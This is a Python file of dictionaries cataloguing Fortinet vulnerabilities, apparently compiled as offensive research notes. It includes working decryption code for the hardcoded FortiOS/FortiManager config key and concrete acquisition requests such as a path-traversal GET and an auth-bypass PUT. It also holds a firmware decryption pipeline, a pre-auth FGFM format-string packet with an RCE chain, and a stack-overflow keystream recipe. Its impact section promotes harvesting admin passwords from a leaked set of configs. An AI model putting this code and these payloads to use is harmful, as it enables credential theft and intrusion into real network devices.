"""
Fortinet Configuration Encryption RE
Sources:
  - cve-2019-6693/fortigate-decrypt.py
  - CVE-2020-9289/cve-2020-9289.py
  - firmware-tools/fgx/fgx.py (FortiOS 7.6.x full pipeline)
  - firmware-tools/forticrack-bishopfox/forticrack.py (outer XOR layer)
Products: FortiOS (config backup), FortiManager (config backup), all versions
"""

# ---------------------------------------------------------
# FCCR-F01: Hardcoded AES-128-CBC key in all FortiOS config backups
# ---------------------------------------------------------
FCCR_F01_MARY_KEY = {
    "id":       "FCCR-F01",
    "product":  "Fortinet FortiOS (all versions) / FortiManager",
    "cves":     ["CVE-2019-6693", "CVE-2020-9289"],
    "severity": "CRITICAL -- hardcoded AES-128-CBC key decrypts ALL user passwords, HA passwords, private keys from config backups",
    "class":    "Hardcoded cryptographic key (CWE-321)",
    "cisa_kev": "Added June 2025 (still active)",

    "description": (
        "FortiOS stores all encrypted passwords in config files/backups using AES-128-CBC "
        "with the hardcoded key 'Mary had a littl' (16 ASCII bytes, nursery rhyme reference). "
        "This applies to: "
        "  - All local user passwords (set passwd ENC <base64>), "
        "  - HA cluster passwords (set password ENC <base64>), "
        "  - Private keys (set private-key ENC <base64>), "
        "  - FortiManager configuration secrets (CVE-2020-9289). "
        "The key has not changed across any FortiOS version. "
        "An attacker with access to any config backup (via CVE-2018-13379 VPN session dump, "
        "misconfigured backup share, insider access, or physical access) can decrypt all credentials. "
        "CISA added to KEV in June 2025 -- still actively exploited."
    ),

    "key": b"Mary had a littl",  # 16 bytes, AES-128-CBC

    "iv_variants": {
        "CVE-2019-6693 (FortiOS)": (
            "iv = base64_decoded_data[0:4] + b'\\x00' * 12  "
            "(4-byte prefix from ciphertext as partial IV, remaining 12 bytes zeroed)"
        ),
        "CVE-2020-9289 (FortiManager)": (
            "iv = base64_decoded_data[0:16]  "
            "(full 16-byte IV prepended to ciphertext)"
        ),
    },

    "decrypt_fortios": """
import base64
from Cryptodome.Cipher import AES

def decrypt_fortios_password(enc_b64: str) -> str:
    key = b'Mary had a littl'
    data = base64.b64decode(enc_b64)
    iv = data[0:4] + b'\\x00' * 12   # 4-byte prefix + 12 null bytes
    ct = data[4:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.decrypt(ct).decode(errors='ignore').rstrip('\\x00')
""",

    "decrypt_fortimanager": """
import base64
from Cryptodome.Cipher import AES

def decrypt_fmg_secret(enc_b64: str) -> str:
    key = b'Mary had a littl'
    data = base64.b64decode(enc_b64)
    iv = data[0:16]             # full 16-byte IV
    ct = data[16:]
    elen = len(ct) % 16
    if elen:
        ct += b'\\x00' * (16 - elen)  # null-pad to block boundary
    cipher = AES.new(key, iv=iv, mode=AES.MODE_CBC)
    pt = cipher.decrypt(ct)
    if elen:
        pt = pt[:-16]           # strip junk padding block
    return pt.decode()
""",

    "config_targets": {
        "FortiOS user passwd":    "config system admin -> edit <name> -> set passwd ENC <base64>",
        "FortiOS HA password":    "config system ha -> set password ENC <base64>",
        "FortiOS local user":     "config user local -> edit <name> -> set passwd ENC <base64>",
        "FortiOS PKI cert key":   "config certificate local -> edit <name> -> set private-key ENC <base64>",
        "FortiManager admin":     "config system admin -> edit <name> -> set password ENC <base64>",
        "FortiManager HA":        "config system ha -> set password ENC <base64>",
    },

    "acquisition_chains": [
        "CVE-2018-13379: GET /remote/fgt_lang?lang=/../../../../../../../dev/cmdb/sslvpn_websession -> includes active session passwords",
        "CVE-2022-40684: PUT /api/v2/cmdb/system/admin (auth bypass) -> GET /api/v2/cmdb/system/admin returns ENC fields",
        "CVE-2024-47575 (FortiJump): FGFM device impersonation -> JSON-RPC session -> GET /sys/proxy/json -> target FortiGate full config",
        "CVE-2024-55591: WebSocket super_admin CLI -> execute 'show' -> captures all ENC fields",
        "Physical: FortiGate USB backup (auto-created on USB insert) -> full config with ENC passwords",
        "Misconfigured: FortiGate config backup via TFTP/FTP left in accessible location",
    ],

    "impact": (
        "ADMIN CREDENTIAL HARVEST: Any config backup gives all admin account passwords in plaintext. "
        "FortiGate-to-FortiGate trust chains are fully compromised. "
        "Combined with Belsen 2025 leak (15k+ FortiGate configs from compromised Belsen group): "
        "decrypt all admin passwords from that leak with this key."
    ),

    "belsen_context": (
        "Belsen threat group published 15,000+ FortiGate config files in early 2025. "
        "All ENC fields in those files decrypt with 'Mary had a littl'. "
        "This is one of the highest-impact known Fortinet secrets currently in the wild."
    ),
}


# ---------------------------------------------------------
# FCCR-F02: FortiOS firmware encryption -- full decryption pipeline
# ---------------------------------------------------------
FCCR_F02_FIRMWARE_PIPELINE = {
    "id":       "FCCR-F02",
    "product":  "Fortinet FortiOS firmware images (.out files)",
    "versions": "7.0.x through 8.0.0 (separate tools per version range)",
    "severity": "HIGH -- full firmware decryption enables binary analysis and vulnerability research",
    "class":    "Encryption bypass via key recovery (CWE-311)",

    "description": (
        "FortiOS firmware images use a layered encryption scheme. "
        "The outer XOR layer (all versions) uses a 32-byte alphanumeric key derived via known-plaintext attack. "
        "Newer versions add an inner rootfs.gz encryption layer using either Modified RC4 (aarch64 7.6.x) "
        "or AES-CTR (x86_64 7.4.3+ / 7.6.x). "
        "The rootfs.gz decryption key is stored in the flatkc kernel image, "
        "protected only by a weak XOR with a 32-byte seed embedded in the kernel binary. "
        "Full pipeline (fgx.py) handles FortiOS 7.6.x end-to-end."
    ),

    "pipeline_stages": {
        "Stage 1: Outer XOR decrypt": {
            "cipher":      "Custom XOR block cipher, 32-byte alphanumeric key, 512-byte blocks",
            "key_derivation": (
                "Known-plaintext: magic bytes at offset 12 (\\xff\\x00\\xaa\\x55) and 'build' string at offset 16. "
                "derive_key_byte(ko, ct_byte, prev_byte, 0x00): key[i] = prev ^ (known + ko) ^ ct. "
                "PRGA: xor = (prev ^ ct[i] ^ key[ko]) - ko; xor = (xor + 256) & 0xFF; prev = ct[i]; ko = (ko+1)&0x1F. "
                "Key is 32 printable alphanumeric ASCII bytes -- keyspace small enough for brute force if known-plaintext fails."
            ),
            "versions":    "All FortiOS versions (forticrack-bishopfox algorithm)",
            "tool":        "fgx.py stage1_outer_decrypt() or forticrack.py (bishopfox)",
            "output":      "Decrypted binary image with ext3 filesystem at offset 512",
        },
        "Stage 2: Filesystem extraction": {
            "format":      "ext3 at byte offset 512 of decrypted image",
            "targets":     "rootfs.gz, flatkc (compressed kernel), datafs.tar.gz, split_rootfs.tar.xz",
            "tool":        "7z x rootfs.ext -o<output_dir> rootfs.gz flatkc datafs.tar.gz",
        },
        "Stage 3: Kernel crypto material": {
            "source":      "flatkc (flat kernel, converted to ELF via vmlinux-to-elf)",
            "method_aarch64": (
                "XOR brute-force: scan ELF for contiguous [seed(32)] + [enc_RSA(270)]. "
                "Validate: enc[0]^seed[0]==0x30, enc[1]^seed[1]==0x82, enc[2:4]^seed[2:4]==0x010A. "
                "Decrypt RSA DER with seed: dec[i] = enc[i] ^ seed[i & 0x1F]."
            ),
            "method_x86_64": (
                "ChaCha20 via miasm: find fgt_verify_initrd() via objdump rsa_parse_pub_key reference. "
                "Disassemble to find RSI (seed VA) and RDX (RSA key VA). "
                "Derive ChaCha20 key: sha256(seed[k:]+seed[:k]) with split combo enumeration. "
                "Derive IV: sha256(seed[iv:]+seed[:iv])[:16]. "
                "Nonce: iv[4:16], counter: iv[:4] as LE u32."
            ),
            "rsa_key":     "2048-bit RSA public key (DER: 30 82 01 0A 02 82 01 01 ... 02 03 01 00 01)",
            "forticrack_v8_kernel_va": "0xffffffff8179a1a0 (FORT-RC4 key location, FortiOS 8.0.0 x86_64)",
        },
        "Stage 4: rootfs.gz decryption": {
            "format":      "rootfs.gz = [encrypted_data][RSA_signature(256 bytes)]",
            "sig_decrypt": (
                "sig_int = int.from_bytes(rootfs[-256:], 'big'); "
                "payload = pow(sig_int, e, n).to_bytes(...) with PKCS#1 v1.5 structure. "
                "payload contains: [0x01][0xFF...][0x00][crypto_material]. "
                "crypto_material (rootfs.gz decryption key) is in the final bytes."
            ),
            "modified_rc4_aarch64": {
                "versions": "FortiOS 7.6.x aarch64",
                "key":      "Last 32 bytes of RSA payload (rc4_key)",
                "ksa":      "Standard RC4 KSA (256 rounds with 32-byte key: key[i & 0x1F])",
                "prga_modification": (
                    "i_rot = (i & 0x1F) << 3 | (j >> 5) & 0x7; "
                    "j_rot = (j & 0x1F) << 3 | (i >> 5) & 0x7; "
                    "t = (S[i] + S[j]) & 0xFF; u = (S[j] + j) & 0xFF; "
                    "v1 = ((S[i_rot] + S[j_rot]) ^ 0xAA) & 0xFF; "
                    "v2 = ((S[v1] + S[t]) ^ S[u] ^ ct) & 0xFF"
                ),
                "j_init":   "Some kernels reset j=0 at PRGA start; others keep KSA final j. Auto-detect by testing first 2 bytes for gzip magic \\x1f\\x8b.",
            },
            "aes_ctr_x86_64": {
                "versions": "FortiOS 7.4.3+ / 7.6.x x86_64",
                "key":      "32-byte AES-256 key from RSA payload at offset 223:255 (7.6.x) or 191:223 (7.4.x)",
                "iv":       "16-byte counter at payload[207:223] (7.6.x) or [175:191] (7.4.x)",
                "mode":     "AES-256-CTR with custom counter increment",
                "ctr_increment": (
                    "ctr_increment = 0; "
                    "for i in range(16): ctr_increment ^= (counter[i] & 0xF) ^ (counter[i] >> 4); "
                    "if ctr_increment == 0: ctr_increment = 1. "
                    "Nonce = counter[:8] LE, CTR = counter[8:16] LE; CTR += ctr_increment per block."
                ),
            },
        },
    },

    "version_tool_map": {
        "7.0.x-7.2.x":    "forticrack-bishopfox (outer XOR only; rootfs not encrypted)",
        "7.4.0-7.4.1":    "noways-fortigate-crypto or fgx.py (ChaCha20 rootfs decrypt)",
        "7.4.2-7.4.3":    "noways-fortigate-crypto (ChaCha20 + miasm; randorisec-decrypt-rootfs for AES-CTR)",
        "7.4.7+":         "randorisec-decrypt-rootfs (AES-CTR with 7.4.x payload layout)",
        "7.6.x aarch64":  "fgx.py (full pipeline; Modified RC4)",
        "7.6.x x86_64":   "fgx.py with miasm installed (ChaCha20 seed extract + AES-CTR rootfs)",
        "8.0.0":          "forticrack_v8 (FORT-RC4; kernel VA 0xffffffff8179a1a0)",
    },

    "tool_invocation": "python fgx.py <firmware.out> -o ./output --verbose",

    "security_relevance": (
        "Full rootfs extraction enables: "
        "(1) Extract sslvpnd for CVE-2024-21762 gadget discovery (ROP chain adaptation). "
        "(2) Extract /bin/node to confirm version and available APIs. "
        "(3) Find hardcoded credentials, private keys, and other embedded secrets. "
        "(4) Diff across versions to locate patched vulnerability sites. "
        "(5) Run ablation semantic sweep across all binaries in rootfs/bin and rootfs/usr/bin."
    ),
}


# ---------------------------------------------------------
# FCCR-F03: CVE-2024-23113 -- FGFM format string via port 541
# ---------------------------------------------------------
FCCR_F03_FGFM_FORMAT_STRING = {
    "id":       "FCCR-F03",
    "product":  "Fortinet FortiGate / FortiManager FGFM protocol",
    "cve":      "CVE-2024-23113",
    "severity": "CRITICAL -- pre-auth format string on port 541 via authip=%n in FGFM auth handshake",
    "class":    "Format string vulnerability in FGFM service (CWE-134)",
    "port":     541,
    "protocol": "TCP/TLS (FGFM)",

    "description": (
        "The FortiGate-to-FortiManager protocol (FGFM) on TCP port 541 contains a format string "
        "vulnerability in the authentication handshake. "
        "The 'authip' field in the auth request packet is passed to a printf-family function "
        "without sanitization. "
        "Sending authip=%n causes the process to write a value to a memory address, "
        "triggering FORTIFY_SOURCE protection (SIGABRT) on vulnerable systems. "
        "On unprotected builds, this leads to arbitrary memory write / RCE. "
        "Detection: connection drops with TLS alert = vulnerable; response received = patched."
    ),

    "protocol_detail": {
        "connection":  "TLS to port 541 (SSL_CERT_NONE acceptable)",
        "handshake_step_1": "Receive server banner: [flags(4 LE)] + [len(4 LE)] + [body]",
        "exploit_packet": {
            "header":  "0x0001e034 as LE u32 (flags) + (payload_len + 8) as BE u32 (length)",
            "payload": "b'reply 200\\r\\nrequest=auth\\r\\nauthip=%n\\r\\n\\r\\n\\x00'",
        },
        "detection_logic": "ssl.SSLError with 'tlsv1 alert' or 'unexpected message' = vulnerable (FORTIFY_SOURCE triggered)",
    },

    "chain_with_fortijump": (
        "CVE-2024-47575 (FortiJump) establishes an FGFM channel from a rogue device to FortiManager. "
        "CVE-2024-23113 is exploitable on the same port 541. "
        "Chain: spoof FGFM device identity (trial cert FMG-VM0000000000) to reach the FGFM handler, "
        "then trigger format string in authip field. "
        "Impact: pre-auth RCE on FortiManager before any session establishment."
    ),

    "affected_products": [
        "FortiOS 7.0.0-7.0.13",
        "FortiOS 7.2.0-7.2.6",
        "FortiOS 7.4.0-7.4.1",
        "FortiProxy 7.0.x, 7.2.x, 7.4.x",
    ],

    "poc_location": "/home/cowboy/Downloads/fortinet/cve-pocs-extra/CVE-2024-23113/POC-CVE-2024-23113.py",
}


# ---------------------------------------------------------
# FCCR-F04: CVE-2025-32756 -- stack overflow in FortiVoice/FortiMail/FortiNDR
# ---------------------------------------------------------
FCCR_F04_STACK_OVERFLOW_32756 = {
    "id":       "FCCR-F04",
    "product":  "Fortinet FortiVoice / FortiMail / FortiNDR / FortiRecorder / FortiCamera",
    "cve":      "CVE-2025-32756",
    "severity": "CRITICAL -- pre-auth stack overflow via /remote/hostcheck_validate enc parameter",
    "class":    "Stack-based buffer overflow (CWE-121)",

    "description": (
        "FortiVoice, FortiMail, FortiNDR, FortiRecorder, and FortiCamera contain a stack-based "
        "buffer overflow in the /remote/hostcheck_validate endpoint. "
        "The endpoint processes an 'enc' POST parameter that decodes a custom encrypted payload "
        "using an MD5-based keystream. "
        "The payload includes a length field; if the decrypted length exceeds the stack buffer, "
        "a stack overflow occurs. "
        "The PoC (fortinet_cve_2025_32756_poc.py, 195 GitHub stars) demonstrates the mechanism "
        "but does not achieve RCE -- the payload is crafted to overflow with 'A' * 64."
    ),

    "endpoint":     "POST /remote/hostcheck_validate",
    "parameter":    "enc=<payload>",

    "keystream_algorithm": {
        "step_1":    "GET /remote/info -> extract salt (hardcoded in PoC as 'e0b638ac')",
        "step_2":    "initial_state = md5(salt + seed + 'GCC is the GNU Compiler Collection.').hexdigest()",
        "step_3":    "keystream: current = md5(bytes.fromhex(current)).hexdigest(); repeat until length",
        "payload":   "seed (8 hex chars) + enc_length (4 hex: target_len ^ keystream[0:4]) + encrypted_data",
        "note":      "The GCC string constant as salt material suggests this is a debug/legacy code path",
    },

    "same_endpoint_as_21762": (
        "CVE-2024-21762 (OOB write on FortiOS sslvpnd) also targets /remote/hostcheck_validate "
        "but uses a different mechanism (URL-encoded form body with B*1808 layout). "
        "CVE-2025-32756 uses the 'enc' parameter specifically, suggesting a separate code path "
        "or a different validation routine on different products."
    ),

    "affected": ["FortiVoice", "FortiMail", "FortiNDR", "FortiRecorder", "FortiCamera"],
    "poc_location": "/home/cowboy/Downloads/fortinet/cve-pocs-extra/CVE-2025-32756-POC/fortinet_cve_2025_32756_poc.py",
    "poc_stars": 195,
}
